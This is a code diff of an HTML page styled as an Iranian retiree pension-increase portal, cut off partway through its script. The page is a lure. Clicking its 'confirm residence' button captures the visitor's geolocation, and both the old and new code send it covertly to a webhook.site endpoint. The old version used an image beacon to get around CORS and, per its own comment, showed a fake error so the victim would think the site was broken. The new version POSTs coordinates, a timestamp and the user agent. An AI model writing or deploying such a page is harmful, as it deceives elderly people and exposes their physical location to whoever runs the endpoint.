@@ -5,42 +5,99 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>سامانه بررسی وضعیت حقوق</title>
     <style>
-        body { font-family: Tahoma, Arial, sans-serif; text-align: center; padding: 20px; background-color: #f4f7f6; direction: rtl; }
-        .container { max-width: 500px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        body {
+            font-family: Tahoma, Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #f4f7f6;
+            direction: rtl;
+        }
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
         h2 { color: #2c3e50; }
-        p { color: #7f8c8d; margin-bottom: 25px; }
-        .btn { background-color: #2ecc71; color: white; padding: 15px 30px; font-size: 18px; font-weight: bold; border: none; cursor: pointer; border-radius: 10px; transition: background 0.3s; }
+        p { color: #7f8c8d; margin-bottom: 25px; line-height: 2; }
+        .btn {
+            background-color: #2ecc71;
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            border-radius: 10px;
+            transition: background 0.3s;
+        }
         .btn:hover { background-color: #27ae60; }
+        .btn:disabled { opacity: 0.6; cursor: wait; }
+        #result {
+            margin-top: 25px;
+            color: #2c3e50;
+            line-height: 2;
+            overflow-wrap: anywhere;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>سامانه بررسی افزایش حقوق بازنشستگان</h2>
-        <p>جهت تایید منطقه سکونت و مشاهده وضعیت پرداخت‌ها، روی دکمه زیر کلیک نمایید.</p>
-        <button class="btn" onclick="getLocation()">تأیید منطقه سکونت و ورود</button>
-    </div>
 
-    <script>
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(sendPosition, showError, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            });
-        } else {
-            alert("مرورگر شما از قابلیت مکان‌یابی پشتیبانی نمی‌کند.");
-        }
+<div class="container">
+    <h2>سامانه بررسی افزایش حقوق بازنشستگان</h2>
+    <p>
+        جهت بررسی منطقه سکونت و مشاهده وضعیت پرداخت‌ها،
+        روی دکمه زیر کلیک نمایید.
+    </p>
+    <button class="btn" id="locationBtn">
+        تأیید منطقه سکونت و ورود
+    </button>
+    <div id="result" aria-live="polite"></div>
+</div>
+
+<script>
+const button = document.getElementById("locationBtn");
+const result = document.getElementById("result");
+const WEBHOOK_URL = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";
+
+button.addEventListener("click", getLocation);
+
+function getLocation() {
+    result.textContent = "";
+    if (!window.isSecureContext) {
+        result.textContent = "اتصال امن HTTPS لازم است.";
+        return;
     }
+    if (!navigator.geolocation) {
+        result.textContent = "مرورگر شما از مکان‌یابی پشتیبانی نمی‌کند.";
+        return;
+    }
+    button.disabled = true;
+    result.textContent = "در انتظار اجازه و دریافت موقعیت...";
 
-    function sendPosition(position) {
-        var lat = position.coords.latitude;
-        var lon = position.coords.longitude;
-        var webhookUrl = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";
-        
-        // روش جدید: ارسال داده‌ها از طریق یک درخواست تصویر (برای دور زدن خطای CORS)
-        var dataUrl = webhookUrl + "?lat=" + lat + "&lon=" + lon;
-        var img = new Image();
-        img.src = dataUrl;
+    navigator.geolocation.getCurrentPosition(
+        showPosition,
+        showError,
+        { enableHighAccuracy: false, timeout: 20000, maximumAge: 0 }
+    );
+}
 
-        // نمایش پیام خطا برای کاربر (برای اینکه فکر کند سایت خراب است)
+async function showPosition(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    // --- شروع ارسال به وب‌هوک ---
+    try {
+        // ارسال داده‌ها به صورت POST
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            mode: 'no-cors', // جلوگیری از خطای CORS
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                latitude: lat,
+                longitude: lon,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            })
